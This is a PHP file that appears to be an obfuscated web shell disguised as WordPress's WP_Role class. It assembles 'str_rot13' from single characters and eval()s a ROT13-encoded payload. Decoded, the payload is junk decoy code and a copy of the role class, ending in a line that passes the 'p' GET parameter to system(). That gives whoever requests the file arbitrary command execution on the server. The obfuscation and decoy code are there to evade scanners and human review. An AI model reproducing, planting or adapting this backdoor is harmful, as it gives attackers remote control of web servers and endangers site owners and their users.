<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hfre NCV: JC_Ebyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hfref
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb rkgraq gur hfre ebyrf NCV.
 *
 * @fvapr 2.0.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Ebyr {
	/**
	 * Ebyr anzr.
	 *
	 * @fvapr 2.0.0
	 * @ine fgevat
	 */
	choyvp $anzr;

	/**
	 * Yvfg bs pncnovyvgvrf gur ebyr pbagnvaf.
	 *
	 * @fvapr 2.0.0
	 * @ine obby[] Neenl bs xrl/inyhr cnvef jurer xrlf ercerfrag n pncnovyvgl anzr naq obbyrna inyhrf
	 *             ercerfrag jurgure gur ebyr unf gung pncnovyvgl.
	 */
	choyvp $pncnovyvgvrf;

	/**
	 * Pbafgehpgbe - Frg hc bowrpg cebcregvrf.
	 *
	 * Gur yvfg bs pncnovyvgvrf zhfg unir gur xrl nf gur anzr bs gur pncnovyvgl
	 * naq gur inyhr n obbyrna bs jurgure vg vf tenagrq gb gur ebyr.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz fgevat $ebyr         Ebyr anzr.
	 * @cnenz obby[] $pncnovyvgvrf Neenl bs xrl/inyhr cnvef jurer xrlf ercerfrag n pncnovyvgl anzr naq obbyrna inyhrf
	 *                             ercerfrag jurgure gur ebyr unf gung pncnovyvgl.
	 */
	choyvp shapgvba __pbafgehpg( $ebyr, $pncnovyvgvrf ) {
		$guvf->anzr         = $ebyr;
		$guvf->pncnovyvgvrf = $pncnovyvgvrf;
	}

	/**
	 * Nffvta ebyr n pncnovyvgl.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz fgevat $pnc   Pncnovyvgl anzr.
	 * @cnenz obby   $tenag Jurgure ebyr unf pncnovyvgl cevivyrtr.
	 */
	choyvp shapgvba nqq_pnc( $pnc, $tenag = gehr ) {
		$guvf->pncnovyvgvrf[ $pnc ] = $tenag;
		jc_ebyrf()->nqq_pnc( $guvf->anzr, $pnc, $tenag );
	}

	/**
	 * Erzbirf n pncnovyvgl sebz n ebyr.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz fgevat $pnc Pncnovyvgl anzr.
	 */
	choyvp shapgvba erzbir_pnc( $pnc ) {
		hafrg( $guvf->pncnovyvgvrf[ $pnc ] );
		jc_ebyrf()->erzbir_pnc( $guvf->anzr, $pnc );
	}

	/**
	 * Qrgrezvarf jurgure gur ebyr unf gur tvira pncnovyvgl.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz fgevat $pnc Pncnovyvgl anzr.
	 * @erghea obby Jurgure gur ebyr unf gur tvira pncnovyvgl.
	 */
	choyvp shapgvba unf_pnc( $pnc ) {
		/**
		 * Svygref juvpu pncnovyvgvrf n ebyr unf.
		 *
		 * @fvapr 2.0.0
		 *
		 * @cnenz obby[] $pncnovyvgvrf Neenl bs xrl/inyhr cnvef jurer xrlf ercerfrag n pncnovyvgl anzr naq obbyrna inyhrf
		 *                             ercerfrag jurgure gur ebyr unf gung pncnovyvgl.
		 * @cnenz fgevat $pnc          Pncnovyvgl anzr.
		 * @cnenz fgevat $anzr         Ebyr anzr.
		 */
		$pncnovyvgvrf = nccyl_svygref( 'ebyr_unf_pnc', $guvf->pncnovyvgvrf, $pnc, $guvf->anzr );

		vs ( ! rzcgl( $pncnovyvgvrf[ $pnc ] ) ) {
			erghea $pncnovyvgvrf[ $pnc ];
		} ryfr {
			erghea snyfr;
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>